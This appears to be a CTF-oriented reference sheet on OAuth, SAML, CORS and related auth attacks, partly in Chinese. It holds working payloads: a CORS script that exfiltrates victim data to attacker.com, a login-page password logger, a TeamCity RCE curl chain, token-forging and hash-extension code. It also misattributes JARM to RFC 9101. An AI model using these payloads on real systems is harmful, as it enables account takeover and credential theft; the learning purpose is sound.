# CTF Web - OAuth, SAML & Infrastructure Auth Attacks

## Table of Contents
- [OAuth/OIDC Exploitation](#oauthoidc-exploitation)
  - [Open Redirect Token Theft](#open-redirect-token-theft)
  - [OIDC ID Token Manipulation](#oidc-id-token-manipulation)
  - [OAuth State Parameter CSRF](#oauth-state-parameter-csrf)
- [CORS Misconfiguration](#cors-misconfiguration)
- [Git History Credential Leakage (Barrier HTB)](#git-history-credential-leakage-barrier-htb)
- [CI/CD Variable Credential Theft (Barrier HTB)](#cicd-variable-credential-theft-barrier-htb)
- [Identity Provider API Takeover (Barrier HTB)](#identity-provider-api-takeover-barrier-htb)
- [SAML SSO Flow Automation (Barrier HTB)](#saml-sso-flow-automation-barrier-htb)
- [Apache Guacamole Connection Parameter Extraction (Barrier HTB)](#apache-guacamole-connection-parameter-extraction-barrier-htb)
- [Login Page Poisoning for Credential Harvesting (Watcher HTB)](#login-page-poisoning-for-credential-harvesting-watcher-htb)
- [TeamCity REST API RCE (Watcher HTB)](#teamcity-rest-api-rce-watcher-htb)
- [Base64 Decode Leniency and Parameter Override for Signature Bypass (BCTF 2016)](#base64-decode-leniency-and-parameter-override-for-signature-bypass-bctf-2016)
- [Hash Length Extension Attack (ASIS CTF 2017)](#hash-length-extension-attack-asis-ctf-2017)
- [WebAuthn / Passkey / FIDO2 (Web Authentication)](#webauthn--passkey--fido2--web-authentication)
- [OAuth 2.1-era Flows: DPoP / PAR / Device Flow / JARM](#oauth-21-era-flows-dpop--par--device-flow--jarm)

For JWT/JWE token attacks, see [auth-jwt.md](auth-jwt.md). For general auth bypass and access control, see [auth-and-access.md](auth-and-access.md).

---

## OAuth/OIDC Exploitation

### Open Redirect Token Theft
```python
# OAuth authorization with redirect_uri manipulation
# If redirect_uri validation is weak, steal tokens via open redirect
import requests

# Step 1: Craft malicious authorization URL
auth_url = "https://target.com/oauth/authorize"
params = {
    "client_id": "legitimate_client",
    "redirect_uri": "https://target.com/callback/../@attacker.com",  # path traversal
    "response_type": "code",
    "scope": "openid profile"
}
# Victim clicks → auth code sent to attacker's server

# Common redirect_uri bypasses:
# https://target.com/callback?next=https://evil.com
# https://target.com/callback/../@evil.com
# https://target.com/callback%23@evil.com  (fragment)
# https://target.com/callback/.evil.com
# https://target.com.evil.com  (subdomain)
```

### OIDC ID Token Manipulation
```python
# If server accepts unsigned tokens (alg: none)
import jwt, json, base64

token = "eyJ..."  # captured ID token
header, payload, sig = token.split(".")
# Decode and modify
payload_data = json.loads(base64.urlsafe_b64decode(payload + "=="))
payload_data["sub"] = "admin"
payload_data["email"] = "admin@target.com"

# Re-encode with alg:none
new_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=")
new_payload = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).rstrip(b"=")
forged = f"{new_header.decode()}.{new_payload.decode()}."
```

### OAuth State Parameter CSRF
```python
# Missing or predictable state parameter allows CSRF
# Attacker initiates OAuth flow, captures callback URL with auth code
# Sends callback URL to victim → victim's session linked to attacker's OAuth account

# Detection: Check if state parameter is:
# 1. Present in authorization request
# 2. Validated on callback
# 3. Bound to user session (not just random)
```

**Key insight:** OAuth/OIDC (OpenID Connect) attacks typically target redirect_uri validation (open redirect → token theft), token manipulation (alg:none, JWKS injection), or state parameter CSRF. Always test redirect_uri with path traversal, fragment injection, and subdomain tricks.

---

## CORS Misconfiguration

```python
# Test for reflected Origin
import requests

targets = [
    "https://evil.com",
    "https://target.com.evil.com",
    "null",
    "https://target.com%60.evil.com",
]

for origin in targets:
    r = requests.get("https://target.com/api/sensitive",
                     headers={"Origin": origin})
    acao = r.headers.get("Access-Control-Allow-Origin", "")
    acac = r.headers.get("Access-Control-Allow-Credentials", "")
    if origin in acao or acao == "*":
        print(f"[!] Reflected: {origin} -> ACAO: {acao}, ACAC: {acac}")
```

```javascript
// Exploit: steal data via CORS misconfiguration
// Host on attacker server, victim visits this page
fetch('https://target.com/api/user/profile', {
    credentials: 'include'
}).then(r => r.json()).then(data => {
    fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(data)));
});
```

**Key insight:** CORS (Cross-Origin Resource Sharing) is exploitable when `Access-Control-Allow-Origin` reflects the `Origin` header AND `Access-Control-Allow-Credentials: true`. Check for subdomain matching (`*.target.com` accepts `evil-target.com`), null origin acceptance (`sandbox` iframe), and prefix/suffix matching bugs.

---

## Git History Credential Leakage (Barrier HTB)

Secrets removed in later commits remain in git history. Search the full diff history for deleted credentials:
```bash
git log --all --oneline
git show <first_commit>
# Search all history for a keyword across all branches:
git log -p --all -S "password"
```

**Key insight:** `git log -p --all -S "keyword"` searches every commit diff for any string, including deleted secrets. Always check first commits and removed files.

---

## CI/CD Variable Credential Theft (Barrier HTB)

CI/CD (Continuous Integration/Continuous Deployment) variable settings store secrets (API tokens, passwords) readable by project admins. These are often admin-level tokens for connected services (authentik, Vault, AWS).
```bash
# GitLab: Settings -> CI/CD -> Variables (visible to project admins)
# GitHub: Settings -> Secrets and variables -> Actions
# Jenkins: Manage Jenkins -> Credentials
```

**Key insight:** CI/CD variables frequently contain service account tokens with elevated privileges. A GitLab project admin can read all CI/CD variables, which may include tokens for identity providers, secret stores, or cloud platforms.

---

## Identity Provider API Takeover (Barrier HTB)

Exploits an admin API token for identity providers (authentik, Keycloak, Okta) to take over any user account.

**Attack chain:**
1. Enumerate users: `GET /api/v3/core/users/`
2. Set target user's password: `POST /api/v3/core/users/{pk}/set_password/`
3. Check authentication flow stages — if MFA (Multi-Factor Authentication) has `not_configured_action: skip`, it auto-skips when no MFA devices are configured
4. Authenticate through flow step-by-step (GET to start stage, POST to submit, follow 302s)

**Key insight:** Identity provider admin tokens are the keys to the kingdom. If MFA stages have `not_configured_action: skip`, setting a user's password is sufficient for full account takeover — no MFA bypass needed.

---

## SAML SSO Flow Automation (Barrier HTB)

Automates SAML (Security Assertion Markup Language) SSO login for services like Guacamole or internal apps when you control IdP (Identity Provider) credentials.

**Steps:**
1. Start login flow at the service — capture `SAMLRequest` + `RelayState` from the redirect
2. Authenticate with IdP (via API or session)
3. Submit IdP's signed `SAMLResponse` + original `RelayState` to service callback
4. Extract auth token from state parameter redirect

**Key insight:** Preserve `RelayState` through the entire flow — it correlates the callback with the login request. Mismatched `RelayState` causes authentication failure even with a valid `SAMLResponse`.

---

## Apache Guacamole Connection Parameter Extraction (Barrier HTB)

Apache Guacamole stores SSH keys, passwords, and connection details in MySQL. Extract them with DB access or an authenticated API token:
```bash
# Via API with auth token
curl "http://TARGET:8080/guacamole/api/session/data/mysql/connections/1/parameters?token=$TOKEN"
# Returns: hostname, port, username, private-key, passphrase
```

```sql
-- Via MySQL directly
SELECT c.connection_name, cp.parameter_name, cp.parameter_value
FROM guacamole_connection c
JOIN guacamole_connection_parameter cp ON c.connection_id = cp.connection_id;
```

**Key insight:** Guacamole connection parameters contain plaintext SSH private keys and passphrases. A single API token or database access exposes credentials for every managed host.

---

## Login Page Poisoning for Credential Harvesting (Watcher HTB)

Injects a credential logger into the web app login page to capture plaintext passwords:
```php
// Add after successful login check in index.php:
$f = fopen('/dev/shm/creds.txt', 'a+');
fputs($f, "{$_POST['name']}:{$_POST['password']}\n");
fclose($f);
```

Wait for automated logins (bots, cron scripts). Check audit logs for frequently-logging-in users — they likely have hardcoded credentials you can harvest.

**Key insight:** `/dev/shm/` is a tmpfs mount writable by any user and invisible to most monitoring. Automated services (backup scripts, health checks) often authenticate with elevated credentials on predictable schedules.

---

## TeamCity REST API RCE (Watcher HTB)

Exploits TeamCity admin credentials to achieve RCE (Remote Code Execution) through build step injection:
```bash
# 1. Create project
curl -X POST 'http://HOST:8111/httpAuth/app/rest/projects' \
  -u 'USER:PASS' -H 'Content-Type: application/xml' \
  -d '<newProjectDescription name="pwn" id="pwn"><parentProject locator="id:_Root"/></newProjectDescription>'

# 2. Create build config
curl -X POST 'http://HOST:8111/httpAuth/app/rest/projects/pwn/buildTypes' \
  -u 'USER:PASS' -H 'Content-Type: application/xml' \
  -d '<newBuildTypeDescription name="rce" id="rce"><project id="pwn"/></newBuildTypeDescription>'

# 3. Add command-line build step
curl -X POST 'http://HOST:8111/httpAuth/app/rest/buildTypes/id:rce/steps' \
  -u 'USER:PASS' -H 'Content-Type: application/xml' \
  -d '<step name="cmd" type="simpleRunner"><properties>
    <property name="script.content" value="cat /root/root.txt"/>
    <property name="use.custom.script" value="true"/>
  </properties></step>'

# 4. Trigger build
curl -X POST 'http://HOST:8111/httpAuth/app/rest/buildQueue' \
  -u 'USER:PASS' -H 'Content-Type: application/xml' \
  -d '<build><buildType id="rce"/></build>'

# 5. Read build log for output
curl 'http://HOST:8111/httpAuth/downloadBuildLog.html?buildId=ID' -u 'USER:PASS'
```

**Key insight:** If build agent runs as root, all build steps execute as root. Check `ps aux` for build agent process ownership. TeamCity REST API provides full project/build management — admin credentials = RCE.

---

## Base64 Decode Leniency and Parameter Override for Signature Bypass (BCTF 2016)

Server RSA-signs an order string, then parses `&`-separated parameters. Python's `b64decode()` silently ignores non-base64 characters. Appending `&price=0` after the base64 signature exploits both behaviors:

```python
# Original signed order: "item=widget&price=100"
# Server returns: base64(RSA_sign(order)) as signature

# Attack: append &price=0 after the signature
# b64decode("VALID_SIG_BASE64&price=0") silently ignores "&price=0"
# But the parameter parser sees: item=widget&price=100&price=0
# Last value wins: price=0
```

**Key insight:** Gap between what is signed (pre-signature content) and what is parsed (full string including post-signature data), enabled by base64's tolerance for non-alphabet characters. Any system that concatenates signed data with unsigned parameters and uses lenient base64 decoding is vulnerable. Defense: validate signature over the exact bytes being parsed, not a subset.

---

## Hash Length Extension Attack (ASIS CTF 2017)

*See also [ctf-crypto/modern-ciphers-2.md — Hash Length Extension Attack (PlaidCTF 2014)](../ctf-crypto/modern-ciphers-2.md#hash-length-extension-attack-plaidctf-2014) for the canonical crypto writeup of the same primitive.*

**Pattern:** Merkle-Damgård hash functions (MD5, SHA-1, SHA-256) used as `MAC = H(secret || message)` are vulnerable to length extension. Given `H(secret || message)` and the length of `secret`, an attacker can compute `H(secret || message || padding || extension)` without knowing the secret. The internal hash state at the end of the original digest is sufficient to continue hashing.

```python
# Vulnerable MAC construction:
import hashlib
mac = hashlib.sha256(secret + message).hexdigest()
# Server sends: mac + message to client, verifies by recomputing H(secret || message)

# Attack: extend the message without knowing the secret
# hashpumpy does the heavy lifting:
import hashpumpy

original_mac = "a1b2c3..."     # known hash
original_msg = b"user=alice"   # known message
secret_len   = 16              # known or brute-forced (try 1-100)
extension    = b"&admin=true"  # data to append

new_mac, new_msg = hashpumpy.hashpump(
    original_mac,   # original hexdigest
    original_msg,   # original data (without secret)
    extension,      # data to append
    secret_len      # secret length
)

# new_msg = original_msg + padding + extension
# new_mac = valid H(secret || new_msg) without knowing secret
```

```bash
# Alternative: hash_extender tool
hash_extender \
    --data "user=alice" \
    --secret-min 1 --secret-max 50 \
    --append "&admin=true" \
    --signature "a1b2c3..." \
    --format sha256

# Or: manual Python with hashpumpy, brute-force secret length
for length in range(1, 101):
    new_mac, new_msg = hashpumpy.hashpump(orig_mac, orig_msg, extension, length)
    r = requests.get(url, params={"data": new_msg.hex(), "mac": new_mac})
    if "success" in r.text:
        print(f"Secret length: {length}, Flag: {r.text}")
        break
```

**Padding structure:** Between the original message and the extension, the hash algorithm inserts its standard padding:
```text
original_msg || 0x80 || 0x00...0x00 || length_in_bits (8 bytes big-endian)
```
This padding is part of `new_msg` — the server will verify it as-is.

**Vulnerable algorithms:** MD5, SHA-1, SHA-224, SHA-256, SHA-384, SHA-512 (all Merkle-Damgård). **Not vulnerable:** HMAC (uses two separate hash passes), SHA-3/Keccak (sponge construction), BLAKE2/3.

**Key insight:** Any Merkle-Damgård hash used as `H(secret || data)` without HMAC construction leaks internal state at the message boundary, enabling arbitrary message extension. Use `hashpumpy` or `hash_extender`. If the secret length is unknown, brute-force it (1-100 is a reasonable range for CTFs) — the valid extension will produce a server-accepted MAC.

---

## WebAuthn / Passkey / FIDO2 (Web Authentication)

WebAuthn (W3C L2，配套 FIDO2 CTAP2) 用非对称凭据取代密码。**registration（attestation）与 assertion 均为 challenge-response**：RP 生成 per-session 随机 `challenge` → `navigator.credentials.create()/get()` → 认证器返回 `PublicKeyCredential`。攻击面集中在 `response` JSON（RP 侧校验 + 客户端可控字段）：
- `clientDataJSON`：`type`（`webauthn.create`/`webauthn.get`）、`challenge`、`origin`、`crossOrigin`
- `authenticatorData`：`rpIdHash` = `SHA-256(rpId)`（32B）、flags 字节（UP bit0 / UV bit2 / AT bit6）、`signCount`（4B）、attestedCredentialData（AAGUID + credential ID + COSE 公钥/alg）
- assertion 签名覆盖 `authenticatorData || SHA-256(clientDataJSON)`；注册还回传 attestation 对象（`fmt`：`packed`/`fido-u2f`/`tpm`/`none` + `attStmt`）。不确定处：各 WebAuthn 库（python-webauthn/go-webauthn 等）默认校验严格度不同，CTF 常出现"只验 challenge 不验 origin"之类的裁剪实现

**RP 侧校验缺陷：**
- challenge 不校验/可预测/不绑定 session → 重放捕获的 assertion；credential ID 未绑定 session → 任意已注册凭据冒充该会话
- origin 验错 / RP ID 绑定缺陷：必须比对 `clientDataJSON.origin` 白名单并重算 `SHA-256(rpId)`；只验其一、或 `rpId` 取自客户端 → 在攻击者控制的子域完成注册/断言
- 签名算法混淆：COSE alg（ES256=-7 / RS256=-257 / EdDSA=-8）取自客户端提交的注册数据，或断言被包成 JWT 时 `alg` 头被忽略 → 换用已知私钥的算法重签
- userHandle 注入：RP 信任 assertion 里的 `userHandle` 而非自己的会话 → 填受害者 userHandle 完成账户接管

**注册/断言篡改：**
- 改 `response.authenticatorData`：翻转 UP/UV 位绕过用户验证、`signCount` 回退到旧值（RP 未强制单调递增）、伪造 `rpIdHash`
- attestation 伪造：要求硬件 attestation 却接受 `fmt:"none"`/self-attestation；`x5c` 链自签或未锚定到 FIDO CA（attCA 绕过）→ 任意伪造新凭据

**重复凭据 / 恢复流程：**
- passkey 云同步（iCloud Keychain / Google Password Manager）使同一凭据跨设备可用——RP 假设"一设备一凭据"或允许同一 credential ID 注册到多账号 → 跨账号滥用
- 恢复码流程未重新验证即重置/禁用 WebAuthn MFA → 第二因素绕过

**Phishing 面：**
- conditional mediation（`mediation:"conditional"`）无手势自动填充 → 注入 autofill 的页面骗取已同步 passkey
- RP ID 混淆（子域）：RP ID 取可注册域后缀时，攻击者控制的子域也能作为该 RP 接收合法断言

**CTF 识别信号：** 页面 JS 出现 `navigator.credentials.create()/get()` / `PublicKeyCredential`；后端接受 `credential`/`clientDataJSON`/`authenticatorData`/`signature` JSON（`/webauthn/register`、`/assertion` 类端点）；源码含 challenge/origin/rpIdHash 校验逻辑 → 逐项找漏验字段。

---

## OAuth 2.1-era Flows: DPoP / PAR / Device Flow / JARM

（不确定项：OAuth 2.1 仍为 draft（draft-ietf-oauth-v2-1）；DPoP/PAR/device flow 均已 RFC 化——RFC 9449 / RFC 9126 / RFC 8628，JARM 为 RFC 9101；各家实现的端点/参数名略有差异。）

**DPoP (RFC 9449) — sender-constrained access token**
- 机制：客户端每个请求带 `DPoP` header（proof JWT，claims：`htu`=完整请求 URI、`htm`=HTTP 方法、`jti`=唯一 ID、`iat`、可选 `nonce`；nonce 由服务端经 `DPoP-Nonce` 下发）。AS 返回 `token_type:"DPoP"` 的 token，并以 `ath` claim（token 的 SHA-256 base64url）把 token 绑定到 proof 的 `jwk` 公钥。
- 攻击面：
  - nonce 不校验/复用（接受陈旧或任意 nonce）→ proof 跨时间重放；`jti` 不去重 → 同一 proof+请求原样重放（重复换 token、API 重放）
  - `ath` 缺失/不校验 → token 未真正绑定 proof key，偷到 token 就能配任意 proof 使用
  - 设计缺陷：资源端点同时接受 `Authorization: Bearer` → DPoP 绑定被静默绕过（token 窃取后免 proof）
  - key confusion：server 信任 proof 里的 `jwk`/`kid` 而非注册的客户端 key，或所有客户端共享一把 key → 伪造 proof；`htu` 比对过松（去端口/大小写/query）→ proof 跨请求复用
- 利用思路/CTF 识别：请求头出现 `DPoP` JWT、响应有 `DPoP-Nonce`、token 为 `token_type:"DPoP"` 且含 `ath` → 先试 `Bearer` 直发，再试删 `ath`/改 `htu`/重放 `jti`。

**PAR (RFC 9126) — pushed authorization request**
- 机制：客户端把完整授权请求 POST 到 AS 的 PAR 端点（`/par`、`/oauth/par`、`/as/par`），换得短时效 `request_uri` + `expires_in`，再重定向用户到 `/authorize?client_id=...&request_uri=...`（浏览器地址栏不再携带全部参数，防 URL 过长与重定向参数污染）。
- 攻击面：
  - `request_uri` 复用/篡改：未绑定 client_id/session/一次性时，攻击者预先 push 自己的 client+redirect_uri，把 authorize URL 发给受害者 → 受害者会话产生的 code 落入攻击者 redirect_uri
  - PAR 端点本身未校验 `redirect_uri`/`client_id` → 开放重定向/token 窃取；`expires_in` 过长或不失效 → request_uri 长期可复用
  - 参数走私：PAR 时校验参数、`/authorize` 时 URL 参数覆盖 pushed request（`scope`/`redirect_uri`/`response_type` 追加进重定向 URL 生效）
- 利用思路/CTF 识别：`.../par` POST 返回 `request_uri`/`expires_in`；authorize URL 带 `request_uri=urn:ietf:params:oauth:request_uri:*` → 构造自己的 pushed request 诱导受害者授权。

**Device Flow (RFC 8628)**
- 机制：客户端取 `device_code` + `user_code`（短码，常见 8 字符 base20、4-4 分组）+ `verification_uri(_complete)`；用户输码授权后，客户端以 `grant_type=urn:ietf:params:oauth:grant-type:device_code` 轮询 `/token`（`authorization_pending`/`slow_down`/`expired_token`）。
- 攻击面：
  - device/user code 低熵（8 位）且轮询无速率限制 → 暴力枚举 device_code/user_code
  - user_code 混淆：同网段受害者把攻击者展示的码输进去 → 攻击者的 device 拿到 token
  - `interval` 未强制 → 高频轮询；授权后 `verification_uri_complete`/redirect 上的 token 泄露（参数注入、referer/日志泄漏）
- 利用思路/CTF 识别：出现 `/device_authorization`/`/device/code` 端点、`urn:ietf:params:oauth:grant-type:device_code`、JSON 含 `user_code`/`verification_uri_complete` → 枚举短码、篡改 `verification_uri_complete` 参数。

**JARM (RFC 9101) — 简述**
- 机制：授权响应（`code`/`state`）以 AS 签名 JWT 返回（`response_mode=jwt`），客户端应校验 `iss`/`aud`/`nonce`/`exp`。
- 定位：OAuth 响应混淆/中继（mix-up）攻击的检测信号——登录链路被代理/可改写 redirect 时，签名 + aud/nonce 绑定使响应无法跨 client 中继；利用角度：客户端跳过 JARM 校验时，可把 A client 的响应 JWT 转发给 B client（mix-up 复活）。
- CTF 识别：authorize 请求带 `response_mode=jwt`/`form_post`；redirect 片段/query 中是 AS 签名的响应 JWT（含 `code`/`state` claims）。
